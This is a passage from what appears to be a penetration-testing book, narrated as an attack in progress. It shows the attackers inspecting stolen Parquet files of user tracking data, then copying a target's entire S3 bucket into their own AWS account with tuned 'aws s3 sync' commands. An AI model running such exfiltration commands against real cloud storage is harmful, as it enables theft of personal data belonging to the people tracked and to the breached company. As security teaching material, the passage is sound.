- pgno: 234
  md: 'We see some files with the extension .parquet. Parquet is a file format known
    for its high compression ratio, which is achieved by storing data in a columnar
    format. It leverages the accurate observation that, in most databases, a column
    tends to store data of the same type (for example, integers), while a row is more
    likely to store different types of data. Instead of grouping data by row, like
    most DB engines do, Parquet groups them by column, thus achieving over 95 percent
    compression ratios.


    We install the necessary tools to decompress and manipulate .parquet files and
    then open a few random files:


    ```

    root@Point1:~/# python -m pip install parquet-cli

    root@Point1:~/# parq 02/user_sessions_stats.parquet -head 100

    userid = c9e2b1905962fa0b344301540e615b628b4b2c9f

    interest_segment = 4878647678

    ts = 1557900000

    time_spent = 3

    last_ad = 53f407233a5f0fe92bd462af6aa649fa

    last_provider = 34

    ip.geo.x = 52.31.46.2

    --snip--


    root@Point1:~/# parq 03/perf_stats.parquet -head 100

    click = 2

    referrer = 9735842

    deviceUID = 03108db-65f2-4d7c-b884-bb908d111400

    --snip--


    root@Point1:~/# parq 03/social_stats.parquet -head 100

    social_segment = 61895815510

    fb_profile = 3232698

    insta_profile = 987615915

    pinterest_profile = 57928

    --snip--

    ```


    We retrieve user IDs, social profiles, interest segments, time spent on ads, geolocation,
    and other alarming information tracking user behavior. Now we have something to
    show for our efforts. The data is erratic, stored in a specialized format and
    hardly decipherable, but we will figure it out eventually.


    We could provision a few terabytes of storage on our machine and proceed to fully
    pilfer these three buckets. Instead, we just instruct AWS to copy the bucket to
    our own account, but it needs a bit of tweaking to increase the pace first:


    ```

    root@Point1:~/# aws configure set default.s3.max_concurrent_requests 1000

    root@Point1:~/# aws configure set default.s3.max_queue_size 100000

    root@Point1:~/# aws s3 sync s3://gretsch-hadoop/ s3://my-gretsch-hadoop

    ```


    We have all the data from the three Hadoop buckets. Don’t get too excited, though;
    this data is almost impossible to process without some hardcore exploration, business
    knowledge, and, of course, computing power. Let’s face it, we are way out of our
    league.'
